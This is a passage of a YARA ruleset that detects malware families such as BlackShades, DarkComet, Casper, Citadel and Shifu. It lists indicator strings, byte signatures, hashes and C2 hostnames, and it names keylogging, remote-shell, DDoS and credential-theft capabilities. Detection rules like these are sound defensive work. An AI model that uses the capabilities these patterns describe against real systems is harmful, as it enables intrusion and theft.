		description = "Detects the Babar Malware used in the SNOWGLOBE attacks - file babar.exe"
		author = "Florian Roth"
		reference = "http://motherboard.vice.com/read/meet-babar-a-new-malware-almost-certainly-created-by-france"
		date = "2015/02/18"
		hash = "27a0a98053f3eed82a51cdefbdfec7bb948e1f36"
		score = 80
	strings:
		$mz = { 4d 5a }
		$z0 = "admin\\Desktop\\Babar64\\Babar64\\obj\\DllWrapper" ascii fullword
		$z1 = "User-Agent: Mozilla/4.0 (compatible; MSI 6.0;" ascii fullword
		$z2 = "ExecQueryFailled!" fullword ascii
		$z3 = "NBOT_COMMAND_LINE" fullword
		$z4 = "!!!EXTRACT ERROR!!!File Does Not Exists-->[%s]" fullword

		$s1 = "/s /n %s \"%s\"" fullword ascii
		$s2 = "%%WINDIR%%\\%s\\%s" fullword ascii
		$s3 = "/c start /wait " fullword ascii
		$s4 = "(D;OICI;FA;;;AN)(A;OICI;FA;;;BG)(A;OICI;FA;;;SY)(A;OICI;FA;;;LS)" ascii

		$x1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\" fullword ascii
		$x2 = "%COMMON_APPDATA%" fullword ascii
		$x4 = "CONOUT$" fullword ascii
		$x5 = "cmd.exe" fullword ascii
		$x6 = "DLLPATH" fullword ascii
	condition:
		( $mz at 0 ) and filesize < 1MB and
		(
			( 1 of ($z*) and 1 of ($x*) ) or
			( 3 of ($s*) and 4 of ($x*) )
		)
}
rule WinntiPharma
{
meta:
	author = "Jose Ramon Palanco"
	copyright = "Drainware, Inc."
	date = "2015-06-23"
	description = "Backdoor Win64 Winnti Pharma"
	ref = "https://securelist.com/blog/research/70991/games-are-over/"

strings:
	$s0 = "Cookie: SN="
	$s1 = "{3ec05b4a-ea88-1378-3389-66706ba27600}"
	$s2 = "{4D36E972-E325-11CE-BFC1-08002BE10318}"
	$s3 = "master secret"
	$s4 = "MyEngineNetEvent"
condition:
	all of ($s*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as
    long as you use it under this license.
*/
rule backoff {
    meta:
        author = "Brian Wallace @botnet_hunter"
        author_email = "bwall@ballastsecurity.net"
        date = "2014-08-21"
        description = "Identify Backoff"
	strings:
    	$s1 = "&op=%d&id=%s&ui=%s&wv=%d&gr=%s&bv=%s"
        $s2 = "%s @ %s"
        $s3 = "Upload KeyLogs"
    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule BangatCode : Bangat Family 
{
    meta:
        description = "Bangat code features"
        author = "Seth Hardy"
        last_modified = "2014-07-10"
    
    strings:
        // dec [ebp + procname], push eax, push edx, call get procaddress
        $ = { FE 4D ?? 8D 4? ?? 50 5? FF }
    
    condition:
        any of them
}

rule BangatStrings : Bangat Family
{
    meta:
        description = "Bangat Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-07-10"
        
    strings:
        $lib1 = "DreatePipe"
        $lib2 = "HetSystemDirectoryA"
        $lib3 = "SeleaseMutex"
        $lib4 = "DloseWindowStation"
        $lib5 = "DontrolService"
        $file = "~hhC2F~.tmp"
        $mc = "~_MC_3~"

    condition:
       all of ($lib*) or $file or $mc
}

rule Bangat : Family
{
    meta:
        description = "Bangat"
        author = "Seth Hardy"
        last_modified = "2014-07-10"
        
    condition:
        BangatCode or BangatStrings
}


/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule BlackShades_3 : Trojan
{
    meta:
        description = "BlackShades RAT"
	author = "botherder https://github.com/botherder"

    strings:
        $mod1 = /(m)odAPI/
        $mod2 = /(m)odAudio/
        $mod3 = /(m)odBtKiller/
        $mod4 = /(m)odCrypt/
        $mod5 = /(m)odFuctions/
        $mod6 = /(m)odHijack/
        $mod7 = /(m)odICallBack/
        $mod8 = /(m)odIInet/
        $mod9 = /(m)odInfect/
        $mod10 = /(m)odInjPE/
        $mod11 = /(m)odLaunchWeb/
        $mod12 = /(m)odOS/
        $mod13 = /(m)odPWs/
        $mod14 = /(m)odRegistry/
        $mod15 = /(m)odScreencap/
        $mod16 = /(m)odSniff/
        $mod17 = /(m)odSocketMaster/
        $mod18 = /(m)odSpread/
        $mod19 = /(m)odSqueezer/
        $mod20 = /(m)odSS/
        $mod21 = /(m)odTorrentSeed/

        $tmr1 = /(t)mrAlarms/
        $tmr2 = /(t)mrAlive/
        $tmr3 = /(t)mrAnslut/
        $tmr4 = /(t)mrAudio/
        $tmr5 = /(t)mrBlink/
        $tmr6 = /(t)mrCheck/
        $tmr7 = /(t)mrCountdown/
        $tmr8 = /(t)mrCrazy/
        $tmr9 = /(t)mrDOS/
        $tmr10 = /(t)mrDoWork/
        $tmr11 = /(t)mrFocus/
        $tmr12 = /(t)mrGrabber/
        $tmr13 = /(t)mrInaktivitet/
        $tmr14 = /(t)mrInfoTO/
        $tmr15 = /(t)mrIntervalUpdate/
        $tmr16 = /(t)mrLiveLogger/
        $tmr17 = /(t)mrPersistant/
        $tmr18 = /(t)mrScreenshot/
        $tmr19 = /(t)mrSpara/
        $tmr20 = /(t)mrSprid/
        $tmr21 = /(t)mrTCP/
        $tmr22 = /(t)mrUDP/
        $tmr23 = /(t)mrWebHide/

    condition:    
        10 of ($mod*) or 10 of ($tmr*)
}

rule BlackShades2 : Trojan
{
	meta:
		author="Kevin Falcoz"
		date="26/06/2013"
		description="BlackShades Server"
		
	strings:
		$signature1={62 73 73 5F 73 65 72 76 65 72}
		$signature2={43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44}
		$signature3={6D 6F 64 49 6E 6A 50 45}
		
	condition:
		$signature1 and $signature2 and $signature3
}

rule BlackShades_4 : rat
{
	meta:
		description = "BlackShades"
		author = "Jean-Philippe Teissier / @Jipe_"
		date = "2013-01-12"
		filetype = "memory"
		version = "1.0" 

	strings:
		$a = { 42 00 6C 00 61 00 63 00 6B 00 73 00 68 00 61 00 64 00 65 00 73 }
		$b = { 36 00 3C 00 32 00 20 00 32 00 32 00 26 00 31 00 39 00 3E 00 1D 00 17 00 17 00 1C 00 07 00 1B 00 03 00 07 00 28 00 23 00 0C 00 1D 00 10 00 1B 00 12 00 00 00 28 00 37 00 10 00 01 00 06 00 11 00 0B 00 07 00 22 00 11 00 17 00 00 00 1D 00 1B 00 0B 00 2F 00 26 00 01 00 0B }
		$c = { 62 73 73 5F 73 65 72 76 65 72 }
		$d = { 43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44 }
		$e = { 6D 6F 64 49 6E 6A 50 45 }
		$apikey = "f45e373429c0def355ed9feff30eff9ca21eec0fafa1e960bea6068f34209439"

	condition:
		any of ($a, $b, $c, $d, $e) or $apikey		
}


rule BlackShades : Trojan
{
	meta:
		author="Kevin Falcoz"
		date="26/06/2013"
		description="BlackShades Server"
		
	strings:
		$signature1={62 73 73 5F 73 65 72 76 65 72}
		$signature2={43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44}
		$signature3={6D 6F 64 49 6E 6A 50 45}
		
	condition:
		$signature1 and $signature2 and $signature3
}

rule BlackShades_25052015
{
    meta:
        author = "Brian Wallace (@botnet_hunter)"
        date = "2014/04"
        ref = "http://malwareconfig.com/stats/PoisonIvy"
        ref = "http://blog.cylance.com/a-study-in-bots-blackshades-net"
        family = "blackshades"

    strings:
        $string1 = "bss_server"
        $string2 = "txtChat"
        $string3 = "UDPFlood"
    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as
    long as you use it under this license.
*/
rule BlackWorm{
    meta:
        author = "Brian Wallace @botnet_hunter"
        author_email = "bwall@ballastsecurity.net"
        date = "2015-05-20"
        description = "Identify BlackWorm"
    strings:
        $str1 = "m_ComputerObjectProvider"
        $str2 = "MyWebServices"
        $str3 = "get_ExecutablePath"
        $str4 = "get_WebServices"
        $str5 = "My.WebServices"
        $str6 = "My.User"
        $str7 = "m_UserObjectProvider"
        $str8 = "DelegateCallback"
        $str9 = "TargetMethod"
        $str10 = "000004b0" wide
        $str11 = "Microsoft Corporation" wide
    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Bolonyokte : rat 
{
	meta:
		description = "UnknownDotNet RAT - Bolonyokte"
		author = "Jean-Philippe Teissier / @Jipe_"
		date = "2013-02-01"
		filetype = "memory"
		version = "1.0" 

	strings:
		$campaign1 = "Bolonyokte" ascii wide
		$campaign2 = "donadoni" ascii wide
		
		$decoy1 = "nyse.com" ascii wide
		$decoy2 = "NYSEArca_Listing_Fees.pdf" ascii wide
		$decoy3 = "bf13-5d45cb40" ascii wide
		
		$artifact1 = "Backup.zip"  ascii wide
		$artifact2 = "updates.txt" ascii wide
		$artifact3 = "vdirs.dat" ascii wide
		$artifact4 = "default.dat"
		$artifact5 = "index.html"
		$artifact6 = "mime.dat"
		
		$func1 = "FtpUrl"
		$func2 = "ScreenCapture"
		$func3 = "CaptureMouse"
		$func4 = "UploadFile"

		$ebanking1 = "Internet Banking" wide
		$ebanking2 = "(Online Banking)|(Online banking)"
		$ebanking3 = "(e-banking)|(e-Banking)" nocase
		$ebanking4 = "login"
		$ebanking5 = "en ligne" wide
		$ebanking6 = "bancaires" wide
		$ebanking7 = "(eBanking)|(Ebanking)" wide
		$ebanking8 = "Anmeldung" wide
		$ebanking9 = "internet banking" nocase wide
		$ebanking10 = "Banking Online" nocase wide
		$ebanking11 = "Web Banking" wide
		$ebanking12 = "Power"

	condition:
		any of ($campaign*) or 2 of ($decoy*) or 2 of ($artifact*) or all of ($func*) or 3 of ($ebanking*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule BoousetCode : Boouset Family 
{
    meta:
        description = "Boouset code tricks"
        author = "Seth Hardy"
        last_modified = "2014-06-19"
        
    strings:
        $boousetdat = { C6 ?? ?? ?? ?? 00 62 C6 ?? ?? ?? ?? 00 6F C6 ?? ?? ?? ?? 00 6F C6 ?? ?? ?? ?? 00 75 }
        
    condition:
        any of them
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as
    long as you use it under this license.
*/
rule Bozok
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Bozok"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "getVer" nocase
		$b = "StartVNC" nocase
		$c = "SendCamList" nocase
		$d = "untPlugin" nocase
		$e = "gethostbyname" nocase

	condition:
		all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Bublik : Downloader
{
	meta:
		author="Kevin Falcoz"
		date="29/09/2013"
		description="Bublik Trojan Downloader"
		
	strings:
		$signature1={63 6F 6E 73 6F 6C 61 73}
		$signature2={63 6C 55 6E 00 69 6E 66 6F 2E 69 6E 69}
		
	condition:
		$signature1 and $signature2
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule CAP_HookExKeylogger
{
meta:
    author = "Brian C. Bell -- @biebsmalwareguy"
    reference = "https://github.com/DFIRnotes/rules/blob/master/CAP_HookExKeylogger.yar"

	strings:
	$str_Win32hookapi = "SetWindowsHookEx" nocase
	$str_Win32llkey = "WH_KEYBOARD_LL" nocase
	$str_Win32key = "WH_KEYBOARD" nocase

	condition:
    2 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Casper_Backdoor_x86 {
	meta:
		description = "Casper French Espionage Malware - Win32/ProxyBot.B - x86 Payload http://goo.gl/VRJNLo"
		author = "Florian Roth"
		reference = "http://goo.gl/VRJNLo"
		date = "2015/03/05"
		hash = "f4c39eddef1c7d99283c7303c1835e99d8e498b0"
		score = 80
	strings:
		$s1 = "\"svchost.exe\"" fullword wide
		$s2 = "firefox.exe" fullword ascii
		$s3 = "\"Host Process for Windows Services\"" fullword wide
		
		$x1 = "\\Users\\*" fullword ascii
		$x2 = "\\Roaming\\Mozilla\\Firefox\\Profiles\\*" fullword ascii
		$x3 = "\\Mozilla\\Firefox\\Profiles\\*" fullword ascii
		$x4 = "\\Documents and Settings\\*" fullword ascii
		
		$y1 = "%s; %S=%S" fullword wide
		$y2 = "%s; %s=%s" fullword ascii
		$y3 = "Cookie: %s=%s" fullword ascii
		$y4 = "http://%S:%d" fullword wide
		
		$z1 = "http://google.com/" fullword ascii
		$z2 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALC)" fullword ascii
		$z3 = "Operating System\"" fullword wide
	condition:
		( all of ($s*) ) or
		( 3 of ($x*) and 2 of ($y*) and 2 of ($z*) )
}

rule Casper_EXE_Dropper {
	meta:
		description = "Casper French Espionage Malware - Win32/ProxyBot.B - Dropper http://goo.gl/VRJNLo"
		author = "Florian Roth"
		reference = "http://goo.gl/VRJNLo"
		date = "2015/03/05"
		hash = "e4cc35792a48123e71a2c7b6aa904006343a157a"
		score = 80
	strings:
		$s0 = "<Command>" fullword ascii
		$s1 = "</Command>" fullword ascii
		$s2 = "\" /d \"" fullword ascii
		$s4 = "'%s' %s" fullword ascii
		$s5 = "nKERNEL32.DLL" fullword wide
		$s6 = "@ReturnValue" fullword wide
		$s7 = "ID: 0x%x" fullword ascii
		$s8 = "Name: %S" fullword ascii
	condition:
		7 of them
}

rule Casper_Included_Strings {
	meta:
		description = "Casper French Espionage Malware - String Match in File - http://goo.gl/VRJNLo"
		author = "Florian Roth"
		reference = "http://goo.gl/VRJNLo"
		date = "2015/03/06"
		score = 50
	strings:
		$a0 = "cmd.exe /C FOR /L %%i IN (1,1,%d) DO IF EXIST"
		$a1 = "& SYSTEMINFO) ELSE EXIT"
		
		$mz = { 4d 5a }
		$c1 = "domcommon.exe" wide fullword							// File Name
		$c2 = "jpic.gov.sy" fullword 								// C2 Server
		$c3 = "aiomgr.exe" wide fullword							// File Name
		$c4 = "perfaudio.dat" fullword								// Temp File Name
		$c5 = "Casper_DLL.dll" fullword								// Name 
		$c6 = { 7B 4B 59 DE 37 4A 42 26 59 98 63 C6 2D 0F 57 40 } 	// Decryption Key
		$c7 = "{4216567A-4512-9825-7745F856}" fullword 				// Mutex
	condition:
		all of ($a*) or
		( $mz at 0 ) and ( 1 of ($c*) )
}

rule Casper_SystemInformation_Output {
	meta:
		description = "Casper French Espionage Malware - System Info Output - http://goo.gl/VRJNLo"
		author = "Florian Roth"
		reference = "http://goo.gl/VRJNLo"
		date = "2015/03/06"
		score = 70	
	strings:
		$a0 = "***** SYSTEM INFORMATION ******"
		$a1 = "***** SECURITY INFORMATION ******"
		$a2 = "Antivirus: "
		$a3 = "Firewall: "
		$a4 = "***** EXECUTION CONTEXT ******"
		$a5 = "Identity: "
		$a6 = "<CONFIG TIMESTAMP="
	condition:
		all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Cerberus : rat
{
	meta:
		description = "Cerberus"
		author = "Jean-Philippe Teissier / @Jipe_"
		date = "2013-01-12"
		filetype = "memory"
		version = "1.0" 

	strings:
		$checkin = "Ypmw1Syv023QZD"
		$clientpong = "wZ2pla"
		$serverping = "wBmpf3Pb7RJe"
		$generic = "cerberus" nocase

	condition:
		any of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule citadel13xy : banker
{
	meta:
		author = "Jean-Philippe Teissier / @Jipe_"
		description = "Citadel 1.5.x.y trojan banker"
		date = "2013-01-12" 
		version = "1.0" 
		filetype = "memory"

	strings:
		$a = "Coded by BRIAN KREBS for personnal use only. I love my job & wife."
		$b = "http://%02x%02x%02x%02x%02x%02x%02x%02x.com/%02x%02x%02x%02x/%02x%02x%02x%02x%02x.php"
		$c = "%BOTID%"
		$d = "%BOTNET%"
		$e = "cit_video.module"
		$f = "bc_remove"
		$g = "bc_add"
		$ggurl = "http://www.google.com/webhp"

	condition:
		3 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule CookiesStrings : Cookies Family
{
    meta:
        description = "Cookies Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-20"
        
    strings:
        $zip1 = "ntdll.exePK"
        $zip2 = "AcroRd32.exePK"
        $zip3 = "Setup=ntdll.exe\x0d\x0aSilent=1\x0d\x0a"
        $zip4 = "Setup=%temp%\\AcroRd32.exe\x0d\x0a"
        $exe1 = "Leave GetCommand!"
        $exe2 = "perform exe success!"
        $exe3 = "perform exe failure!"
        $exe4 = "Entry SendCommandReq!"
        $exe5 = "Reqfile not exist!"
        $exe6 = "LeaveDealUpfile!"
        $exe7 = "Entry PostData!"
        $exe8 = "Leave PostFile!"
        $exe9 = "Entry PostFile!"
        $exe10 = "\\unknow.zip" wide ascii
        $exe11 = "the url no respon!"
        
    condition:
      (2 of ($zip*)) or (2 of ($exe*))
}

rule Cookies : Family
{
    meta:
        description = "Cookies"
        author = "Seth Hardy"
        last_modified = "2014-06-20"
        
    condition:
        CookiesStrings
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-10-18
	Identifier: Fareit Oct 2015
*/

rule Fareit_Trojan_Oct15 {
	meta:
		description = "Detects Fareit Trojan from Sep/Oct 2015 Wave"
		author = "Florian Roth"
		reference = "http://goo.gl/5VYtlU"
		date = "2015-10-18"
		score = 80
		super_rule = 1
		hash1 = "230ca0beba8ae712cfe578d2b8ec9581ce149a62486bef209b04eb11d8c088c3"
		hash2 = "3477d6bfd8313d37fedbd3d6ba74681dd7cb59040cabc2991655bdce95a2a997"
		hash3 = "408fa0bd4d44de2940605986b554e8dab42f5d28a6a525b4bc41285e37ab488d"
		hash4 = "76669cbe6a6aac4aa52dbe9d2e027ba184bf3f0b425f478e8c049637624b5dae"
		hash5 = "9486b73eac92497e703615479d52c85cfb772b4ca6c846ef317729910e7c545f"
		hash6 = "c3300c648aebac7bf1d90f58ea75660c78604410ca0fa705d3b8ec1e0a45cdd9"
		hash7 = "ff83e9fcfdec4ffc748e0095391f84a8064ac958a274b9684a771058c04cb0fa"
	strings:
		$s1 = "ebai.exe" fullword wide
		$s2 = "Origina" fullword wide
	condition:
		uint16(0) == 0x5a4d and $s1 in (0..30000) and $s2 in (0..30000)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/
rule Shifu_Banking_Trojan {
	meta:
		description = "Detects Shifu Banking Trojan"
		author = "Florian Roth"
		reference = "https://securityintelligence.com/shifu-masterful-new-banking-trojan-is-attacking-14-japanese-banks/"
		date = "2015-09-01"
		hash1 = "4ff1ebea2096f318a2252ebe1726bcf3bbc295da9204b6c720b5bbf14de14bb2"
		hash2 = "4881c7d89c2b5e934d4741a653fbdaf87cc5e7571b68c723504069d519d8a737"
	strings:
		$x1 = "c:\\oil\\feet\\Seven\\Send\\Gather\\Dividerail.pdb" fullword ascii

		$s1 = "listen above" fullword wide
		$s2 = "familycould cost" fullword wide
		$s3 = "SetSystemTimeAdjustment" fullword ascii /* Goodware String - occured 33 times */
		$s4 = "PeekNamedPipe" fullword ascii /* Goodware String - occured 347 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and ($x1 or all of ($s*))
}

rule SHIFU_Banking_Trojan {
	meta:
		description = "Detects SHIFU Banking Trojan"
		author = "Florian Roth"
		reference = "http://goo.gl/52n8WE"
		date = "2015-10-31"
		score = 70
		hash1 = "0066d1c8053ff8b0c07418c7f8d20e5cd64007bb850944269f611febd0c1afe0"
		hash2 = "3956d32a870d81be34cafc867769b2a2f55a96360070f1cb3d9addc2918357d5"
		hash3 = "3fde1b2b50fcb36a695f1e6bc577cd930c2343066d98982cf982393e55bfce0d"
		hash4 = "457ad4a4d4e675fe09f63873ca3364434dc872dde7d9b64ce7db919eaff47485"
		hash5 = "51edba913e8b83d1388b1be975957e439015289d51d3d5774d501551f220df6f"
		hash6 = "6611a2b79a3acf0003b1197aa5bfe488a33db69b663c79c6c5b023e86818d38b"
		hash7 = "72e239924faebf8209f8e3d093f264f778a55efb56b619f26cea73b1c4feb7a4"
		hash8 = "7a29cb641b9ac33d1bb405d364bc6e9c7ce3e218a8ff295b75ca0922cf418290"
		hash9 = "92fe4f9a87c796e993820d1bda8040aced36e316de67c9c0c5fc71aadc41e0f8"
		hash10 = "93ecb6bd7c76e1b66f8c176418e73e274e2c705986d4ac9ede9d25db4091ab05"
		hash11 = "a0b7fac69a4eb32953c16597da753b15060f6eba452d150109ff8aabc2c56123"
		hash12 = "a8b6e798116ce0b268e2c9afac61536b8722e86b958bd2ee95c6ecdec86130c9"
		hash13 = "d6244c1177b679b3d67f6cec34fe0ae87fba21998d4f5024d8eeaf15ca242503"
		hash14 = "dcc9c38e695ffd121e793c91ca611a4025a116321443297f710a47ce06afb36d"
	strings:
		$x1 = "\\Gather\\Dividerail.pdb" ascii

		$s0 = "\\payload\\payload.x86.pdb" ascii
		$s1 = "USER_PRIV_GUEST" fullword wide
		$s2 = "USER_PRIV_ADMIN" fullword wide
		$s3 = "USER_PRIV_USER" fullword wide
		$s4 = "PPSWVPP" fullword ascii
		$s5 = "WinSCard.dll" fullword ascii /* Goodware String - occured 83 times */
	condition:
		uint16(0) == 0x5a4d and ($x1 or 5 of ($s*))
}
rule Shifu : Shifu {
	meta:
		reference = "https://blogs.mcafee.com/mcafee-labs/japanese-banking-trojan-shifu-combines-malware-tools/"
		author = "McAfee Labs"
	strings:
		$b = "RegCreateKeyA"
		$a = "CryptCreateHash"
		$c = {2F 00 63 00 20 00 73 00 74 00 61 00 72 00 74 00 20 00 22 00 22 00 20 00 22 00 25 00 73 00 22 00 20 00 25 00 73 00 00 00 00 00 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 00 72 00 75 00 6E}
		$d = {53 00 6E 00 64 00 56 00 6F 00 6C 00 2E 00 65 00 78 00 65}
		$e = {52 00 65 00 64 00 69 00 72 00 65 00 63 00 74 00 45 00 58 00 45}
	condition:
		all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-10-13
	Identifier: Upatre Campaign October 2015
*/

rule Upatre_Hazgurut {
	meta:
		description = "Detects Upatre malware - file hazgurut.exe"
		author = "Florian Roth"
		reference = "https://weankor.vxstream-sandbox.com/sample/6b857ef314938d37997c178ea50687a281d8ff9925f0c4e70940754643e2c0e3?environmentId=7"
		date = "2015-10-13"
		score = 70
		hash1 = "7ee0d20b15e24b7fe72154d9521e1959752b4e9c20d2992500df9ac096450a50"
		hash2 = "79ffc620ddb143525fa32bc6a83c636168501a4a589a38cdb0a74afac1ee8b92"
		hash3 = "62d8a6880c594fe9529158b94a9336179fa7a3d3bf1aa9d0baaf07d03b281bd3"
		hash4 = "c64282aca980d558821bec8b3dfeae562d9620139dc43d02ee4d1745cd989f2a"
		hash5 = "a35f9870f9d4b993eb094460b05ee1f657199412807abe6264121dd7cc12aa70"
		hash6 = "f8cb2730ebc8fac1c58da1346ad1208585fe730c4f03d976eb1e13a1f5d81ef9"
		hash7 = "b65ad7e2d299d6955d95b7ae9b62233c34bc5f6aa9f87dc482914f8ad2cba5d2"
		hash8 = "6b857ef314938d37997c178ea50687a281d8ff9925f0c4e70940754643e2c0e3"
		hash9 = "33a288cef0ae7192b34bd2ef3f523dfb7c6cbc2735ba07edf988400df1713041"
		hash10 = "2a8e50afbc376cb2a9700d2d83c1be0c21ef942309676ecac897ba4646aba273"
		hash11 = "3d0f2c7e07b7d64b1bad049b804ff1aae8c1fc945a42ad555eca3e1698c7f7d3"
		hash12 = "951360b32a78173a1f81da0ded8b4400e230125d05970d41621830efc5337274"
		hash13 = "bd90faebfd7663ef89b120fe69809532cada3eb94bb94094e8bc615f70670295"
		hash14 = "8c5823f67f9625e4be39a67958f0f614ece49c18596eacc5620524bc9b6bad3d"
	strings:
		$a1 = "barcod" fullword ascii

		$s0 = "msports.dll" fullword ascii
		$s1 = "nddeapi.dll" fullword ascii
		$s2 = "glmf32.dll" fullword ascii
		$s3 = "<requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\">" fullword ascii
		$s4 = "cmutil.dll" fullword ascii
		$s5 = "mprapi.dll" fullword ascii
		$s6 = "glmf32.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1500KB
		and $a1 in (0..4000)
		and all of ($s*)
}
rule Crimson
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		Description = "Crimson Rat"
		date = "2015/05"
		ref = "http://malwareconfig.com/stats/Crimson"
		maltype = "Remote Access Trojan"
		filetype = "jar"

	strings:
		$a1 = "com/crimson/PK"
		$a2 = "com/crimson/bootstrapJar/PK"
		$a3 = "com/crimson/permaJarMulti/PermaJarReporter$1.classPK"
		$a4 = "com/crimson/universal/containers/KeyloggerLog.classPK"
        $a5 = "com/crimson/universal/UploadTransfer.classPK"
        
	condition:
        all of ($a*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule cxpidStrings : cxpid Family
{
    meta:
        description = "cxpid Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-23"
        
    strings:
        $ = "/cxpid/submit.php?SessionID="
        $ = "/cxgid/"
        $ = "E21BC52BEA2FEF26D005CF"
        $ = "E21BC52BEA39E435C40CD8"
        $ = "                   -,L-,O+,Q-,R-,Y-,S-"
        
    condition:
       any of them
}

rule cxpidCode : cxpid Family 
{
    meta:
        description = "cxpid code features"
        author = "Seth Hardy"
        last_modified = "2014-06-23"
    
    strings:
        $entryjunk = { 55 8B EC B9 38 04 00 00 6A 00 6A 00 49 75 F9 }
    
    condition:
        any of them
}

rule cxpid : Family
{
    meta:
        description = "cxpid"
        author = "Seth Hardy"
        last_modified = "2014-06-23"
        
    condition:
        cxpidCode or cxpidStrings
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as
    long as you use it under this license.
*/
rule CyberGate
{

	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/CyberGate"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$string1 = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}
		$string2 = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}
		$string3 = "EditSvr"
		$string4 = "TLoader"
		$string5 = "Stroks"
		$string6 = "####@####"
		$res1 = "XX-XX-XX-XX"
		$res2 = "CG-CG-CG-CG"

	condition:
		all of ($string*) and any of ($res*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as
    long as you use it under this license.
*/
rule Cythosia{
    meta:
        author = "Brian Wallace @botnet_hunter"
        author_email = "bwall@ballastsecurity.net"
        date = "2015-03-21"
        description = "Identify Cythosia"
    strings:
        $str1 = "HarvesterSocksBot.Properties.Resources" wide
    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule DarkComet_1
{
    meta:
        description = "DarkComet RAT"
	author = "botherder https://github.com/botherder"

    strings:
        $bot1 = /(#)BOT#OpenUrl/ wide ascii
        $bot2 = /(#)BOT#Ping/ wide ascii
        $bot3 = /(#)BOT#RunPrompt/ wide ascii
        $bot4 = /(#)BOT#SvrUninstall/ wide ascii
        $bot5 = /(#)BOT#URLDownload/ wide ascii
        $bot6 = /(#)BOT#URLUpdate/ wide ascii
        $bot7 = /(#)BOT#VisitUrl/ wide ascii
        $bot8 = /(#)BOT#CloseServer/ wide ascii

        $ddos1 = /(D)DOSHTTPFLOOD/ wide ascii
        $ddos2 = /(D)DOSSYNFLOOD/ wide ascii
        $ddos3 = /(D)DOSUDPFLOOD/ wide ascii

        $keylogger1 = /(A)ctiveOnlineKeylogger/ wide ascii
        $keylogger2 = /(U)nActiveOnlineKeylogger/ wide ascii
        $keylogger3 = /(A)ctiveOfflineKeylogger/ wide ascii
        $keylogger4 = /(U)nActiveOfflineKeylogger/ wide ascii

        $shell1 = /(A)CTIVEREMOTESHELL/ wide ascii
        $shell2 = /(S)UBMREMOTESHELL/ wide ascii
        $shell3 = /(K)ILLREMOTESHELL/ wide ascii

    condition:
